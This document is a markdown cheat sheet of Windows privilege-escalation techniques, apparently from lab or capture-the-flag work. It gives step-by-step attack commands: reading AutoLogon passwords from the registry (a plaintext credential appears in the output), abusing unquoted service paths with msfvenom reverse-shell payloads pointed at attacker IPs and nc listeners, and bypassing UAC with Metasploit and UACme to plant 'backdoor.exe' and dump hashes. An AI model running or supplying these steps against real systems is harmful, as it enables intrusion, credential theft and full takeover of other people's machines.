


### [WINDOWS PRIVILEGE ESCALATION](#)


###### Exploit Suggestor & WinPeas
- Both can be used to find vulnerabilities which can lead to PE
- Finding Kernel exploit by using `Exploit Suggestor` on metasploit
    - `search exploit_suggest` > `multi/recon/local_exploit_suggester` > `set SESSION 1` > `exploit`

- Download WinPeas, transfer it to target and run
    - `https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe`

************************************************************************************************

###### WINDOWS AUTOLOGON CREDS

We can find password of privileged user if he used windows Autologon

**Using Winpeas**

You can find this using Winpeas

```
  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround! 
```

**Manually by reading the registry with PowerShell**
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd "HKLM:\software\microsoft\windows nt\currentversion\winlogon"
*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .
```

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd "HKLM:\software\microsoft\windows nt\currentversion\winlogon"
*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .


    Hive: HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion


Name                           Property
----                           --------
winlogon                       AutoRestartShell             : 1
                               Background                   : 0 0 0
                               CachedLogonsCount            : 10
                               DebugServerCommand           : no
                               DefaultDomainName            : EGOTISTICALBANK
                               DefaultUserName              : EGOTISTICALBANK\svc_loanmanager
                               DisableBackButton            : 1
                               EnableSIHostIntegration      : 1
                               ForceUnlockLogon             : 0
                               LegalNoticeCaption           :
                               LegalNoticeText              :
                               PasswordExpiryWarning        : 5
                               PowerdownAfterShutdown       : 0
                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                 : 1
                               Shell                        : explorer.exe
                               ShellCritical                : 0
                               ShellInfrastructure          : sihost.exe
                               SiHostCritical               : 0
                               SiHostReadyTimeOut           : 0
                               SiHostRestartCountLimit      : 0
                               SiHostRestartTimeGap         : 0
                               Userinit                     : C:\Windows\system32\userinit.exe,
                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled          : 0
                               scremoveoption               : 0
                               DisableCAD                   : 1
                               LastLogOffEndTimePerfCounter : 37689452493
                               ShutdownFlags                : 19
                               DisableLockWorkstation       : 0
                               DefaultPassword              : Moneymakestheworldgoround!



```

###### UNQUOTED SERVICE PATH

> What it is? When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is). 

> Root cause? In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

1. Find the unquoted service path
```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

/i means ignore the case
/v means except <this argument> find others.

2. We need any of the three permission (basically write permission) on the folder in which unquoted service is there

- (F) Full Control
- (M) Modify
- (W) Write

The user / group permissions we are looking for are the following:
- The user we are currently logged in as (%USERNAME%)
- Authenticated Users
- Everyone
- BUILTIN\Users
- NT AUTHORITY\INTERACTIVE

Check both using `icacls` 

```
icacls "C:\Program Files\Zero Tier
```

3. If required write access is there, then generate payload with folder name where space starts.

- (non-meterpreter binary)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/ZeroTier.exe
```

- (meterpreter binary)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/ZeroTier.exe
```


4. Transfer payload to target server by whatever method

5. Start listener on attacker machine

(for non-meterpreter binary)
    - `nc -nlvp 4444`

(for meterpreter binary)

- use metasploit multi/handler

6. Now start the service using cmd or poweshell

    - `net start zerotieroneservice`

    - `Start-Service zerotieroneservice`

7. We get the reversehell with Privileged user/NT Authority

***********************************************************************************************
###### Bypassing UAC prompt

- Checking if user is part of Local Group Administrator
    - `net localgroup administrator`

- Bypassing UAC using metasploit module
    - `use exploit/windows/local/bypassuac_injection ` > `set payload windows/x64/meterpreter/reverse_tcp` > `set SESSION 1` > `set LPORT 1234` >  `set TARGET Windows\ x64 ` > `exploit`
        - This module just disabled UAC, hence we still need to elevate privileges using `getsystem`
        - `getsystem` > `getuid` > `hashdump`

- Bypassing UCA using tool - UACme
    - Creating meterpreter revershe shell Payload and uploading it (in this case uploading using meterpreter session)
        - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe` 
        - `cd C://` > `mkdir temp` > `cd temp` > `upload backdoor.exe`
    - Uploading the UAC executable `Akagai64.exe`
        - `upload /root/Desktop/tools/UACME/Akagi64.exe`
    - Starting listerner on our machine
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LPORT 1234` > `set LHOST 10.10.19.5` > `run`
    - Executing executable 
        - `.\Akagi64 23 C:\temp\backdoor.exe`




